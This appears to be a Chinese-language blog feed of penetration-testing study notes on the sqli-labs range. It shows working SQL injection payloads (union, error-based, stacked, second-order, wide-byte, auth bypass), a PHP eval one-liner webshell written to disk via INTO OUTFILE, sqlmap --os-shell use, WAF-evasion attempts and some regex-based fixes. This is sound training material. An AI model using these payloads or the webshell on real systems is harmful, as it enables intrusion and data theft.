class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);<span class="comment">//使用了GBK编码</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将mysql_query(“SET NAMES gbk”);删除，不设置连接字符集为gbk</p><p>测试输入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>db<span class="string">&#x27; and 1=2 --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508221634520.png"></p><p>成功将‘按原计划进行了转义处理，防止了宽字节注入</p><h4 id="②万能密码修复"><a href="#②万能密码修复" class="headerlink" title="②万能密码修复"></a>②万能密码修复</h4><p>原代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将代码改为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用preg_replace匹配除了字母和数字以外的所有字符，并替换为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$checkname</span>=<span class="title function_ invoke__">check</span>(<span class="variable">$uname</span>);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$checkname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508221651330.png"></p><p>成功防御</p><h4 id="③二次注入"><a href="#③二次注入" class="headerlink" title="③二次注入"></a>③二次注入</h4><p>原代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用preg_replace匹配&#x27; &quot; # 进行转义处理</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);  </span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\#/&#x27;</span>, <span class="string">&quot;\\\#&quot;</span>, <span class="variable">$string</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"><span class="variable">$username</span>= <span class="title function_ invoke__">check</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508221714309.png"></p><p>进行修改密码</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508221715305.png"></p><p>并未修改admin账户的密码，成功防止注入</p><h4 id="④堆叠注入"><a href="#④堆叠注入" class="headerlink" title="④堆叠注入"></a>④堆叠注入</h4><p>原代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原代码使用了mysqli_multi_query，这个允许执行多条sql语句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加</span></span><br><span class="line"><span class="comment">// 防御堆叠注入，过滤分号及其编码形式和其他可能的语句分隔符</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;|%3B|%3b|\x3B|%0D|%0A|\r|\n/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证ID是否为数字</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请输入数字&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508221816487.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508221817584.png"></p><p>注入失败，并未插入数据，防御成功</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-sql注入(2)</title>
      <link href="/2025/08/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(2)/"/>
      <url>/2025/08/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(2)/</url>
      
        <content type="html"><![CDATA[<h3 id="1、手工注入的方式写入一句话木马"><a href="#1、手工注入的方式写入一句话木马" class="headerlink" title="1、手工注入的方式写入一句话木马"></a>1、手工注入的方式写入一句话木马</h3><p>一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;abc&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用sql注入webshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//条件</span><br><span class="line">当前连接数据库用户为root</span><br><span class="line">知道写入绝对路径</span><br><span class="line">secure_file_priv配置，并且为空</span><br></pre></td></tr></table></figure><p>进入靶场mysql配置文件my.ini，mysql默认不配置这个选项，需要手动加进去,一般secure_file_priv在后面的版本应该写在[mysqld]这一栏下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211808963.png"></p><p>绝对路径一般靠猜，比如linux系统的var&#x2F;www&#x2F;html，Windows系统的inetpub\wwwroot、</p><p>既然存在sql注入，可以利用sql注入查看数据库路径来猜测网站路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,@@datadir --+</span><br><span class="line">@@datadir 是一个 MySQL 系统变量，用于显示 MySQL 服务器将数据文件存储在哪一个目录路径下。简单来说，它就是 MySQL 的“数据仓库”或“数据家园”的位置</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211833205.png"></p><p>得知mysql在c盘下的C:\XAMPP2\mysql\data\，一般Windows系统启用apache时web通常在Apache24\htdocs这个目录下，根据url显示的sqli-labs，猜测目录是C:\Apache24\htdocs\sqli-labs这个目录，由于靶场使用的是XAMPP部署网站，这里靶场实际目录是C:\XAMPP2\htdocs\sqli-labs\</p><p>查看当前连接的用户</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,user() --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211844468.png"></p><p>由此可以进行写入webshell</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>函数</span><br><span class="line"><span class="keyword">into</span> outfile</span><br><span class="line"><span class="keyword">into</span> dumpfile</span><br></pre></td></tr></table></figure><p>进入靶场，url输入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 0x3c3f70687020406576616c28245f4745545b27616263275d293b3f3e into outfile &#x27;</span>C:\XAMPP2\htdocs\sqli<span class="operator">-</span>labs\shell.php<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3c3f70687020406576616c28245f4745545b27616263275d293b3f3e为16进制编码，前面的0x让服务器识别这是16进制</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211821458.png"></p><p>页面无正常回显，看看目录下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211822751.png"></p><p>成功写入，我们去浏览器访问这个文件，并输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?adc=system(ipconfig);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211829538.png"></p><p>成功注入，拿到权限</p><h3 id="2、sqlmap工具–os-shell"><a href="#2、sqlmap工具–os-shell" class="headerlink" title="2、sqlmap工具–os-shell"></a>2、sqlmap工具–os-shell</h3><p>自动化写入webshell，利用sqlmap</p><p>来到一个存在sql注入的地方</p><p>获取url，然后发给sqlmap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.18.173/good.php?id=1&quot;</span> --os-shell --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211921004.png"></p><p>成功执行</p><h3 id="3、宽字节注入，堆叠注入，二次注入，万能密码以及相关原理"><a href="#3、宽字节注入，堆叠注入，二次注入，万能密码以及相关原理" class="headerlink" title="3、宽字节注入，堆叠注入，二次注入，万能密码以及相关原理"></a>3、宽字节注入，堆叠注入，二次注入，万能密码以及相关原理</h3><h4 id="①宽字节注入"><a href="#①宽字节注入" class="headerlink" title="①宽字节注入"></a>①宽字节注入</h4><p>后端对输入参数进行处理时，对于一些特殊符号如’ “等进行了\转义处理，并且数据库使用了GBK编码，在进行注入时，加入一些特殊二字节的值与其\进行拼接，此时服务端会认为是一个汉字，从而消除\转义作用，达到绕过</p><p>less-32关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%db%27 --+</span><br><span class="line">%db是某一字符</span><br><span class="line">%27是&#x27;</span><br><span class="line">当%db和\进行组合时变成一个汉字</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211935150.png"></p><p>完成绕过，随后sql语句和普通联合查询一样，但是前面仍然要绕过\</p><h4 id="②堆叠注入"><a href="#②堆叠注入" class="headerlink" title="②堆叠注入"></a>②堆叠注入</h4><p>后端使用mysqli_multi_query() ，允许同时执行多条语句，使用；进行分割</p><p>less-38关</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>利用可执行多条<span class="keyword">sql</span>语句执行插入一个新用户</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;insert into users(id,username,password)</span></span><br><span class="line"><span class="string">values(29,&#x27;</span>caixukun<span class="string">&#x27;,&#x27;</span><span class="number">521314</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211944085.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211945827.png"></p><p>成功执行</p><h4 id="③二次注入"><a href="#③二次注入" class="headerlink" title="③二次注入"></a>③二次注入</h4><p>数据库在保存数据的时候，保存的是原本的数据，没有对一些特殊字符进行转义，但后端在提取数据的时候，也没有进行转义，导致数据和语句进行了闭合拼接引发的错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注册一个admin&#x27;#的用户</span><br><span class="line">后端处理数据代码为</span><br><span class="line">id=&#x27;$id&#x27;</span><br><span class="line">此时对admin&#x27;#这个用户进行操作时后端参数是</span><br><span class="line">id=&#x27;admin&#x27;#&#x27;</span><br><span class="line">#把后面进行了注释，所以实际操作的用户是admin</span><br></pre></td></tr></table></figure><p>less-24</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211952025.png"></p><p>我们登录进去密码是123456</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211955088.png"></p><p>我们修改密码为qwe123</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211956122.png"></p><p>使用admin和qwe123进行登录</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508211956486.png"></p><p>成功登录</p><h4 id="④万能密码"><a href="#④万能密码" class="headerlink" title="④万能密码"></a>④万能密码</h4><p>后端代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">当输入admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span><span class="string">&#x27;#时</span></span><br><span class="line"><span class="string">后端代码就变成</span></span><br><span class="line"><span class="string">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;</span>admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span><span class="string">&#x27;#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$passwd&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">此时#后面代码被注释，前面只校验了一个用户名为admin，且前面语句为真，当存在这个账户时，不用密码，就可以绕过直接登录</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212000096.png"></p><h3 id="4、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称"><a href="#4、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称" class="headerlink" title="4、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称"></a>4、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称</h3><p>将安全狗安装在服务器上</p><p>访问靶场进行注入</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212008592.png"></p><p>发现被拦截，此时去验证拦截的那个字符</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212009348.png"></p><p>‘未被拦截</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212010864.png"></p><p>order by –+也未被拦截</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212011641.png"></p><p>union也未被拦截</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212011825.png"></p><p>select被拦截</p><p>绕过</p><ul><li>大小写绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union SElect 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212012874.png"></p><p>失败</p><ul><li>双写绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union seselectlect 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508212014722.png"></p><p>看似绕过但是语句行不通</p><ul><li>编码绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//url编码select</span><br><span class="line">-1&#x27; union select 1,2,3 --+</span><br><span class="line">-1&#x27; union  1,2,3 --+</span><br></pre></td></tr></table></figure><p>还是不行</p><p>打不过waf</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-sql注入</title>
      <link href="/2025/08/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(1)/"/>
      <url>/2025/08/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(1)/</url>
      
        <content type="html"><![CDATA[<h3 id="1、使用sqlilab演示数字型注入和字符型注入的区别，以及四种sql注入类型，截图说明每一步的含义"><a href="#1、使用sqlilab演示数字型注入和字符型注入的区别，以及四种sql注入类型，截图说明每一步的含义" class="headerlink" title="1、使用sqlilab演示数字型注入和字符型注入的区别，以及四种sql注入类型，截图说明每一步的含义"></a>1、使用sqlilab演示数字型注入和字符型注入的区别，以及四种sql注入类型，截图说明每一步的含义</h3><h4 id="①字符型"><a href="#①字符型" class="headerlink" title="①字符型"></a>①字符型</h4><p>后端输入参数的类型，如果是id&#x3D;’$id’，则代表是字符型</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201555718.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201557939.png"></p><p>当输入1和2-1的时候，页面回显不一样，参数没有进行运算，，代表是字符型，若是数字型则会进行运算</p><h4 id="②数字型"><a href="#②数字型" class="headerlink" title="②数字型"></a>②数字型</h4><p>后端参数如果是id&#x3D;$id，则代表是数字型</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201555718.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201559306.png"></p><p>当输入1和2-1时，页面回显一样，参数进行了运算，则代表是数字型</p><h4 id="③联合查询"><a href="#③联合查询" class="headerlink" title="③联合查询"></a>③联合查询</h4><p>使用union语句，表示同前一语句一起执行，要使用union进行联合查询，必须使select字段数与前语句字段数一致，否则不能成功执行</p><ul><li><h5 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h5><p>order by进行报错，若输入数值小于或等于字段数，则正常回显，若大于字段数则发生报错</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 数值</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4 --+</span></span><br><span class="line"><span class="string">//--+表示注释后面语句</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201618692.png"></p><p>页面发生报错</p><p>换个值order by 3</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201618385.png"></p><p>页面正常回显，证明存在三个字段</p></li><li><h5 id="显示字段回显"><a href="#显示字段回显" class="headerlink" title="显示字段回显"></a>显示字段回显</h5><p>为使我们想要获取的数据正确回显，要查看页面回显位置</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br><span class="line"><span class="string">//id输入一个不存在的值，则返回空，才能看见我们想看见的</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201623338.png"></p></li><li><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>注入sql语句，进行执行</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询当前数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+</span></span><br><span class="line"><span class="string">//查询当前数据库所有表名</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>获取表中字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">//获取数据</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> security.users <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201629983.png"></p><p>拿到数据库名</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201636719.png"></p><p>拿到表名</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201641244.png"></p><p>拿到字段名</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201644937.png"></p><p>拿到数据</p></li><li><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>利用页面的报错信息，将想要的数据提取出来，这些函数优先级较高，所以会先执行</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>函数</span><br><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br><span class="line"><span class="built_in">exp</span>()</span><br><span class="line"><span class="built_in">floor</span>()</span><br></pre></td></tr></table></figure><p>利用extractvalue进行注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>获取数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(1,(select database()))) --+</span></span><br><span class="line"><span class="string">//获取表名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> <span class="keyword">table</span></span><br><span class="line">_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>))) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>获取字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;))) --+</span></span><br><span class="line"><span class="string">//获取数据</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> extractvalue(concat(<span class="number">1</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> security.users))) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201705357.png"></p><p>拿到数据库名</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201704414.png"></p><p>拿到表名</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201710853.png"></p><p>拿到字段名</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201714006.png"></p></li><li><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>页面没有明确回显有效信息，只能根据页面回显效果来进行判断</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>函数</span><br><span class="line">length()</span><br><span class="line">substr()</span><br><span 